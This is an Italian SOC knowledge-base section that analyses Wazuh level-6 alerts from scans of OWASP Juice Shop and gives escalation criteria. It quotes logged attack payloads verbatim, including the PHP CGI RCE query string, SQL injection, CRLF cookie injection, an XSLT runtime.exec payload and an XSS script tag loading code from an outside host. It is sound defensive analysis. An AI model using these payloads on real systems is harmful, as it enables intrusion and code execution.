## Severity: MEDIO (rule.level 6)

**Descrizione generale e contesto operativo**

La severity MEDIO corrisponde al rule.level 6 nella classificazione ufficiale Wazuh, denominato "Low relevance attack". La documentazione ufficiale Wazuh descrive questo livello come eventi che indicano worm, virus o attacchi che non hanno effetto immediato sul sistema, oppure eventi IDS frequenti ed errori frequenti. Nel contesto di questo dataset specifico, il livello 6 è il più eterogeneo dell'intera scala — raggruppa tipologie di attacco profondamente diverse tra loro, da tentativi di PHP code injection a XSS, da SQL injection a bassa confidence a common web attacks generici. Questa eterogeneità è la caratteristica distintiva della fascia MEDIO: Wazuh ha rilevato un pattern sospetto chiaro, ma o la tecnica è nota e il sistema ha risposto senza compromissione, o il payload non è stato eseguito, o la richiesta è stata bloccata prima di raggiungere la logica applicativa critica.

Il dataset è prodotto dal monitoraggio di OWASP Juice Shop, un'applicazione volutamente vulnerabile. Questo contesto è particolarmente rilevante per la fascia MEDIO perché molti degli attacchi classificati a livello 6 sono stati effettivamente tentati su endpoint reali — la ragione per cui rimangono MEDIO invece di scalare a ALTO o CRITICO non è che l'attacco sia fallito per protezione esterna, ma che Wazuh ha rilevato il pattern e lo ha classificato come "low relevance" in base al rule set. In alcuni casi nel dataset la ground truth MEDIO corrisponde a richieste che hanno restituito HTTP 200 — il che significa che il server ha processato la richiesta. Questo è il sotto-insieme più critico della fascia MEDIO e richiede attenzione particolare.

---

**Rule descriptions associate a severity MEDIO nel dataset**

Dall'analisi del CSV, le `rule.description` che Wazuh assegna agli eventi classificati MEDIO sono le seguenti, tutte a rule.level 6:

**`PHP CGI-bin vulnerability attempt.`** — Regola che si attiva quando Wazuh rileva nel path o nei parametri della richiesta i pattern caratteristici della vulnerabilità PHP CGI (CVE-2012-1823 e varianti). Specificamente, il pattern `?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input` nella query string è la firma di questa classe di attacchi. Nel dataset questa è la rule description più frequente per severity MEDIO.

**`SQL injection attempt.`** — Regola che si attiva quando Wazuh rileva pattern SQL nel path o nei parametri. A rule.level 6 invece che 7, il che indica che Wazuh ha classificato questi come tentativi a bassa probabilità di successo o come varianti meno pericolose. La distinzione tra SQL injection a livello 6 (MEDIO) e livello 7 (ALTO) nel dataset dipende dalla specifica firma che ha triggerato la regola.

**`A web attack returned code 200 (success).`** — Questa è la rule description più critica della fascia MEDIO. Indica che una richiesta classificata come web attack ha ricevuto dal server una risposta HTTP 200. Non significa necessariamente che l'attacco sia riuscito in senso pieno — Juice Shop risponde 200 su molte richieste anomale — ma è il segnale che la richiesta è stata processata dall'applicazione invece di essere bloccata a livello di web server.

**`Common web attack.`** — Regola generica di Wazuh che copre pattern di attacco noti ma non classificabili in categorie specifiche. Nel dataset include tentativi di header injection, format string attacks, null byte injection, XSLT injection.

**`Suspicious URL access.`** — Regola che si attiva su accessi a URL considerate sospette per la loro struttura — tipicamente path con estensioni di backup, file di configurazione, file nascosti, file di controllo versione.

**`XSS (Cross Site Scripting) attempt.`** — Regola specifica per tentativi di Cross-Site Scripting. Nel dataset compare a rule.level 6 su alcune richieste, ma la stessa tipologia di attacco a volte scala a livello superiore.

---

**Analisi dettagliata: PHP CGI-bin vulnerability attempt**

La vulnerabilità PHP CGI (CVE-2012-1823) è una delle vulnerabilità PHP più sfruttate storicamente. Permette a un attaccante di passare opzioni della riga di comando a PHP attraverso la query string quando PHP è configurato in modalità CGI. Il payload caratteristico è:

```
?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
```

Decodificato:

```
?-d allow_url_include=1 -d auto_prepend_file=php://input
```

Questo payload istruisce PHP a includere e eseguire il contenuto del body HTTP come file PHP. Se il server fosse vulnerabile e configurato con PHP in modalità CGI, il corpo della richiesta POST verrebbe eseguito come codice PHP — remote code execution completo.

Nel dataset, questi tentativi compaiono su una varietà estrema di path all'interno di Juice Shop:

```
POST /?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/carousel/5.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/carousel/1.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/carousel/3.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/carousel/7.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/products/permafrost.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/products/green_smoothie.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/products/carrot_juice.jpeg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/products/user_day_ticket.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/products/no-results.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/uploads/BeeHaven.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/uploads/favorite-hiking-place.png?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /main.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /socket.io?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /robots.txt?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /font-mfizz.woff?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
POST /MaterialIcons-Regular.woff2?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 200
```

La risposta è sempre HTTP 200. Questo è il dato tecnico più importante: Juice Shop è un'applicazione Node.js/Express, non PHP. Il server non è vulnerabile a CVE-2012-1823 perché PHP non è presente nell'ambiente. La risposta 200 indica che Express ha ricevuto la richiesta e ha servito la risorsa normalmente ignorando la query string malevola — i parametri `-d allow_url_include=1` non hanno alcun significato per un server Node.js.

La copertura sistematica dei path — immagini, file statici, JavaScript, socket.io, sitemap — indica che l'attaccante stava eseguendo uno scan automatizzato dell'intera superficie applicativa per trovare qualsiasi endpoint PHP potenzialmente vulnerabile. Il tool utilizzato è quasi certamente uno scanner automatizzato di vulnerabilità che include questa firma nel suo repertorio standard.

Compaiono anche tentativi verso i path interni di Node.js stessi, evidentemente estratti dallo stack trace dell'applicazione o da errori precedenti:

```
POST /application/node_modules/express/lib/router/index.js:280:10?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/express/lib/router/index.js:328:13?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/express/lib/router/index.js:376:14?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/express/lib/router/assets/public/styles.css?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/express/lib/router/assets/public/vendor.js?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/serve-index/styles.css?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/node_modules/serve-index/index.js:145:39?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/build/routes/assets/public?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/build/routes/fileServer.js:39:13?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/build/routes/main.js?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /application/build/routes/runtime.js?-d+allow_url_include%3d1+... HTTP/1.1 200
```

Il fatto che i path includano numeri di riga come `:280:10`, `:328:13`, `:376:14` indica che l'attaccante ha ottenuto stack trace dettagliati da errori precedenti di Express — Juice Shop in modalità sviluppo espone stack trace completi nelle risposte di errore. Questo è un information disclosure significativo che ha alimentato la fase di reconnaissance.

Anche alcune SVG internazionalizzate di Juice Shop sono state enumerate:

```
POST /ru.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /th.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /bg.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /id.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /il.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /it.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /ie.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /hu.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /gr.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /kr.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /dk.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
POST /ro.svg?-d+allow_url_include%3d1+... HTTP/1.1 200
```

Queste sono le flag SVG dei paesi presenti nell'interfaccia di Juice Shop. Lo scanner le ha enumerate tutte sistematicamente.

I path con risposta 401 invece di 200 compaiono su endpoint protetti da autenticazione:

```
POST /api/Challenges?-d+allow_url_include%3d1+... HTTP/1.1 401
POST /api/Quantitys?-d+allow_url_include%3d1+... HTTP/1.1 401
POST /api/SecurityQuestions?-d+allow_url_include%3d1+... HTTP/1.1 401
POST /api/Quantitys/?-d+allow_url_include%3d1+... HTTP/1.1 401
```

Il 401 indica che il middleware di autenticazione ha intercettato la richiesta prima che arrivasse al router Node.js, quindi il payload PHP non ha nemmeno raggiunto la logica applicativa.

Nei casi con risposta 500:

```
POST /rest/admin?-d+allow_url_include%3d1+... HTTP/1.1 500
POST /rest/captcha?-d+allow_url_include%3d1+... HTTP/1.1 500
POST /rest/user?-d+allow_url_include%3d1+... HTTP/1.1 500
POST /rest/languages?-d+allow_url_include%3d1+... HTTP/1.1 500
POST /rest/admin/application-configuration?-d+allow_url_include%3d1+... HTTP/1.1 500
POST /rest/admin/application-version?-d+allow_url_include%3d1+... HTTP/1.1 500
```

Il 500 indica che Express ha ricevuto la richiesta POST su un endpoint che non gestisce POST correttamente e ha crashato — comportamento normale di Juice Shop.

---

**Analisi dettagliata: SQL injection attempt a livello 6**

Nel dataset compaiono eventi con rule.description "SQL injection attempt." a rule.level 6 invece del livello 7 tipico. La differenza tra i due livelli nella classificazione Wazuh dipende dalla specifica firma che ha triggerato la regola — le firme di livello 6 corrispondono a pattern SQL meno specifici o a varianti che il ruleset considera meno pericolose. Dal dataset i pattern SQL a livello 6 includono:

**Time-based blind SQL injection su `/rest/products/search`:**

```
GET /rest/products/search?q=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+ HTTP/1.1 500
GET /rest/products/search?q=%27%3Bstart-sleep+-s+15.0 HTTP/1.1 500
GET /rest/products/search?q=%27%3Bsleep+15.0%3B%27 HTTP/1.1 500
GET /rest/products/search?q=%27%3B+sleep%2815.0%29%3B+var+x%3D%27 HTTP/1.1 500
GET /rest/products/search?q=%27+%2F+sleep%2815%29+%2F+%27 HTTP/1.1 500
GET /rest/products/search?q=%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27 HTTP/1.1 500
```

Decodificati, questi payload tentano sleep-based blind injection usando sintassi PostgreSQL (`pg_sleep`), PowerShell (`start-sleep`), JavaScript (`java.lang.Thread.sleep`) e sintassi generica. La varietà di sintassi indica un tool automatizzato che testa multiple database backend. Tutti producono 500 → query non eseguita correttamente → MEDIO. Se avessero prodotto 200 con delay effettivo nella risposta, sarebbero stati ALTO o CRITICO.

**SQL injection su `/api/Challenges` con risposta 200:**

```
GET /api/Challenges/?name=Score+Board+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board%22+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board%27+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board+or+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board%22+where+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+... HTTP/1.1 200 30
GET /api/Challenges/?name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+... HTTP/1.1 200 30
```

Questi sono particolarmente interessanti. Il response body è sempre esattamente 30 byte e la risposta è 200. Il payload inietta condizioni SQL nel parametro `name` dell'endpoint Challenges. Il fatto che il body sia sempre 30 byte suggerisce che Juice Shop abbia risposto con un risultato fisso (probabilmente una lista vuota o un challenge specifico) indipendentemente dal payload SQL — il che indica che l'applicazione ha sanitizzato il parametro ma ha comunque risposto positivamente alla richiesta. In una vera SQLi basata su boolean-based blind, la differenza nel response body tra query vera e query falsa è il segnale di vulnerabilità — qui il body è identico in tutti i casi, quindi la tecnica di blind injection non ha prodotto informazioni.

**UNION-based SQL injection su `/api/Challenges`:**

```
GET /api/Challenges/?name=Score+Board%27+UNION+ALL+select+NULL+--+ HTTP/1.1 200 30
GET /api/Challenges/?name=Score+Board%22+UNION+ALL+select+NULL+--+ HTTP/1.1 200 30
```

Tentativi di UNION injection per enumerare colonne. Risposta 200 con body 30 byte — stesso comportamento visto sopra. Il body costante indica che il UNION non ha aggiunto righe al risultato, quindi l'injection non ha funzionato come previsto dall'attaccante.

**SQL injection su path `/assets/public/images/uploads/`:**

```
GET /assets/public/images/uploads/magn(et')%20UNION%20ALL%20select%20NULL%20--%20)ificent!-1571814229653.jpg HTTP/1.1 200
GET /assets/public/images/uploads/magn(et'%20and%20exists%20(%20select%20%22java.lang.Thread.sleep%22(15000)...%20--%20)ificent!-1571814229653.jpg HTTP/1.1 200
GET /assets/public/images/uploads/magn();%20select%20%22java.lang.Thread.sleep%22(15000)...%20--%20)ificent!-1571814229653.jpg HTTP/1.1 200
```

Questi sono tentativi di SQL injection nel filename stesso di un'immagine caricata. Il file `magn(et)ificent!-1571814229653.jpg` è un file reale presente in Juice Shop. L'attaccante ha modificato il nome del file iniettando payload SQL — tecnica usata quando i nomi dei file vengono usati in query SQL senza sanitizzazione. La risposta 200 indica che Express ha servito il file normalmente senza interpretare il payload SQL nel nome.

---

**Analisi dettagliata: A web attack returned code 200 (success)**

Questa è la rule description più critica della fascia MEDIO. La logica di Wazuh è semplice: qualsiasi richiesta classificata come web attack che riceve una risposta 200 genera un alert specifico. Nel dataset i casi principali sono:

**Header injection / HTTP response splitting su `/rest/products/search`:**

```
GET /rest/products/search?q=any%0D%0ASet-cookie%3A+Tamper%3D94cfcd66... HTTP/1.1 200 30
GET /rest/products/search?q=any%3F%0ASet-cookie%3A+Tamper%3D94cfcd66... HTTP/1.1 200 30
GET /rest/products/search?q=any%0D%0ASet-cookie%3A+Tamper%3D94cfcd66 HTTP/1.1 200 30
```

Il payload inietta un header `Set-cookie` attraverso CRLF injection (`%0D%0A`). Se il server riflettesse il parametro `q` negli header di risposta, l'attaccante potrebbe impostare cookie arbitrari nel browser della vittima — vettore per session fixation o cookie injection. La risposta 200 indica che la richiesta è stata processata. Il body di 30 byte è il formato di risposta standard dell'endpoint search di Juice Shop quando non trova risultati. Juice Shop non riflette il parametro nei response header, quindi l'injection non ha avuto effetto, ma la risposta 200 giustifica l'alert.

**Header injection su `/api/Challenges`:**

```
GET /api/Challenges/?name=any%3F%0ASet-cookie%3A+Tamper%3Da49365aa... HTTP/1.1 200 30
```

Stesso pattern sull'endpoint Challenges. Body 30 byte → risultato vuoto → injection non rifless.

**XSS via `/rest/products/search` con risposta 200:**

```
GET /rest/products/search?q=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F421273de...%22%3E HTTP/1.1 200 30
```

Decodificato: `q=</script><script src="http://10.42.1.84:44623/421273de...">`. Questo è un tentativo di Stored XSS — il payload chiude un tag script esistente e ne apre uno nuovo che carica uno script da `10.42.1.84:44623`. L'indirizzo IP `10.42.1.84` è nella subnet del cluster Kubernetes che ospita Juice Shop, quindi è un attaccante interno alla rete. Il body 200 con 30 byte indica che Juice Shop ha accettato la ricerca ma probabilmente ha restituito zero risultati per la query XSS. La vera domanda è se il payload sia stato memorizzato — in Juice Shop, l'endpoint search non persiste le query, quindi questo specifico tentativo di stored XSS non ha prodotto effetti.

**XSS via `/api/Challenges` con risposta 200:**

```
GET /api/Challenges/?name=%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2F10.42.1.84%3A44623%2F5c05d0c7...%22%3E HTTP/1.1 200 30
```

Stesso vettore sull'endpoint Challenges. Il parametro `name` viene usato per filtrare i challenge per nome — se il valore venisse riflesso nella pagina senza sanitizzazione, il XSS si attiverebbe nel browser dell'utente che visualizza quella pagina.

**SQL injection su file immagine con 200:**

```
GET /assets/public/images/uploads/magn(et')%20UNION%20ALL%20select%20NULL%20--%20)ificent!-1571814229653.jpg HTTP/1.1 200
```

Già analizzato sopra. Body non specificato → file immagine servito correttamente → injection nel filename non processata.

---

**Analisi dettagliata: Common web attack**

Questa rule description copre pattern eterogenei che non rientrano nelle categorie più specifiche. Nel dataset:

**Format string attack su `/redirect`:**

```
GET /redirect?to=ZAP+%251%21s%252%21s%253%21s...%2540%21n%0A HTTP/1.1 406
GET /redirect?to=ZAP%25n%25s%25n%25s...%25s%0A HTTP/1.1 406
```

Questi sono tentativi di format string attack — la stringa `%1!s%2!s%3!s...` usa la sintassi di format string di Windows (`!s`), mentre `%n%s%n%s` usa la sintassi C standard. In un'applicazione C vulnerabile, `%n` scrive il numero di byte scritti finora in un indirizzo di memoria, permettendo arbitrary write. Node.js non è vulnerabile a format string attacks di tipo C. La risposta 406 indica che Juice Shop ha rifiutato il redirect.

**Null byte injection su `/rest/products/search`:**

```
GET /rest/products/search?q=%00 HTTP/1.1 500
```

Il null byte `%00` è usato per terminare stringhe in linguaggi C-based e può bypassare validazioni o troncare query SQL. In Node.js/JavaScript il null byte non termina le stringhe — viene trattato come carattere ordinario. Risposta 500 → applicazione crasha sul null byte come input inatteso → MEDIO.

**XSLT injection su `/rest/products/search`:**

```
GET /rest/products/search?q=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E... HTTP/1.1 500
```

Tentativo di XSLT injection che tenta di eseguire `runtime.exec()` Java attraverso trasformazioni XSLT. Tecnica applicabile a server che processano XSLT lato server (tipicamente Java/Tomcat). Juice Shop non usa XSLT → risposta 500 → MEDIO.

**HTTP response splitting su `/redirect`:**

```
GET /redirect?to=any%3F%0ASet-cookie%3A+Tamper%3D45bc40fd... HTTP/1.1 406
```

CRLF injection nel parametro `to`. Risposta 406 → Juice Shop ha rifiutato il redirect → attacco non andato a segno → MEDIO.

**XSS nell'URL con null byte:**

```
GET /redirect?to=%3C%2Ftitle%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ctitle%3E HTTP/1.1 406
GET /redirect?to=%3C%2Fh2%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E HTTP/1.1 406
```

Payload XSS con null byte inserito per bypassare filtri WAF che cercano `<script>` come stringa continua. Il null byte spezza il token sperando che il filtro non lo riconosca come XSS ma che il browser lo ignori e esegua lo script. Juice Shop risponde 406 → redirect rifiutato → XSS non iniettato → MEDIO.

---

**Analisi dettagliata: Suspicious URL access**

La rule description "Suspicious URL access." a livello 6 nel dataset copre accessi a path considerati strutturalmente sospetti indipendentemente dal payload. Nel dataset:

**File di backup con estensioni sospette:**

```
GET /rest/admin.bak HTTP/1.1 500
GET /rest/languages.bak HTTP/1.1 500
GET /rest/user/login.swp HTTP/1.1 500
GET /api/Quantitys.bak HTTP/1.1 500
GET /rest.swp HTTP/1.1 500
GET /api.bak HTTP/1.1 500
GET /rest/products.swp HTTP/1.1 500
GET /rest/products/search.swp HTTP/1.1 500
GET /rest/admin/application-configuration.swp HTTP/1.1 500
GET /api/SecurityQuestions.bak HTTP/1.1 500
GET /rest/admin/application-version.old HTTP/1.1 500 (in alcuni casi)
```

Le estensioni `.bak` e `.swp` sono specificamente monitorate da Wazuh perché corrispondono rispettivamente a file di backup generici e a file swap di Vim — quest'ultimo particolarmente pericoloso perché contiene il contenuto del file che stava editando l'amministratore prima che la sessione venisse interrotta. Un file `.swp` esposto su un server web può contenere configurazioni, password, token o codice sorgente. Tutti i casi nel dataset producono 500 → file non presente → MEDIO.

**File di configurazione e file nascosti:**

```
GET /rest/.htaccess HTTP/1.1 500
GET /rest/admin/.htaccess HTTP/1.1 500
GET /rest/admin/application-configuration.swp HTTP/1.1 500
```

Accessi a `.htaccess` e file di configurazione Apache. In un server Apache questi file possono contenere regole di autenticazione, redirect, configurazioni SSL. In un server Node.js come Juice Shop non esistono → 500 → MEDIO.

---

**Analisi dettagliata: XSS attempt**

Nel dataset compaiono a rule.level 6 due eventi XSS specifici con rule.description "XSS (Cross Site Scripting) attempt.":

```
GET /redirect?to=%3Cscript%3Ealert(5397)%3C/script%3E HTTP/1.1 406
GET /redirect?to=%3Cimg%20src=%22random.gif%22%20onerror=alert(5397)%3E HTTP/1.1 406
```

Il primo è XSS classico via tag `<script>`. Il secondo è XSS via event handler `onerror` su tag `img` — tecnica per bypassare filtri che bloccano `<script>` ma non altri tag HTML. Entrambi producono 406 su `/redirect` — Juice Shop ha rifiutato il redirect → XSS non iniettato nel DOM → MEDIO. Stessa tipologia di attacco con risposta 200 invece di 406 scala al livello superiore.

Il numero `5397` nel payload `alert(5397)` è un identificatore di sessione usato dal tool OWASP ZAP per tracciare quale istanza del browser ha eseguito il codice XSS — questo conferma che l'attacco è stato condotto con ZAP Proxy, uno dei tool di security testing più diffusi.

---

**Correlazioni tra MEDIO e altri livelli di severity**

La fascia MEDIO è quella con le correlazioni più interessanti verso gli altri livelli. Verso il basso, un evento MEDIO si distingue da BASSO principalmente per la presenza di un pattern di attacco riconoscibile nel payload — non solo un errore di navigazione. Verso l'alto, la distinzione tra MEDIO e ALTO dipende quasi interamente dalla risposta HTTP e dalla frequenza. Lo stesso payload SQL injection che a risposta 500 produce MEDIO, a risposta 200 con dati nel body produce ALTO. La stessa richiesta vista una volta è MEDIO, vista sistematicamente dallo stesso IP è CRITICO.

Un pattern rilevante nel dataset: gli eventi PHP CGI MEDIO compaiono in cluster temporali densi — decine di richieste nello stesso secondo, tutte dallo stesso IP (10.42.0.234, 10.42.1.207, 10.42.2.150), su path sistematicamente enumerati. Questo pattern di automazione è visibile nella struttura del timestamp nel `full_log` e nella progressione dei path: prima le root, poi le immagini carousel numerate, poi le immagini prodotti, poi i file di upload, poi i moduli Node.js. È la sequenza di uno scanner che percorre l'albero delle directory in modo breadth-first.

---

**Soglia di escalation da MEDIO**

Un evento MEDIO deve essere rivalutato verso ALTO o CRITICO se si verifica almeno una delle seguenti condizioni specifiche per questo livello di severity:

Per gli eventi PHP CGI: se il response body contiene output PHP eseguito (stringhe come `phpinfo()` output, output di `system()`, contenuto di `/etc/passwd`) invece di essere il corpo normale della risposta Express. In questo dataset non accade mai, ma è la condizione di escalation critica.

Per gli eventi "A web attack returned code 200": se il response body è significativamente più grande del solito per quell'endpoint — indica che il payload ha modificato il risultato della query o ha iniettato contenuto nella risposta. Nel dataset tutti i 200 hanno body di 30 byte (risultato vuoto normalizzato di Juice Shop). Un body di dimensioni diverse indicherebbe che qualcosa è cambiato.

Per gli eventi SQL injection a livello 6: se la risposta ha delay significativo (time-based blind injection riuscita) o se il body contiene dati strutturati che non appartengono alla risposta normale dell'endpoint (boolean-based o error-based injection riuscita).

Per gli eventi Suspicious URL access: se la risposta è 200 invece di 500 o 404 — il file sospetto esiste ed è stato servito.

**Azione raccomandata**

Gli eventi MEDIO richiedono logging con priorità maggiore rispetto a BASSO e revisione in un timeframe più breve — tipicamente entro 24 ore in un contesto SOC operativo. Per gli eventi "A web attack returned code 200" la revisione dovrebbe avvenire entro poche ore, con analisi manuale del response body per verificare che il contenuto sia quello atteso dall'endpoint. Gli eventi PHP CGI con risposta 200 su una piattaforma Node.js sono falsi positivi strutturali — possono essere filtrati a livello di pre-processing se il team ha confermato l'assenza di PHP nell'ambiente. Gli eventi Suspicious URL access con risposta 500 possono essere trattati come BASSO in termini operativi, ma vanno mantenuti a livello MEDIO nella KB perché in ambienti diversi da Juice Shop potrebbero indicare esposizione reale.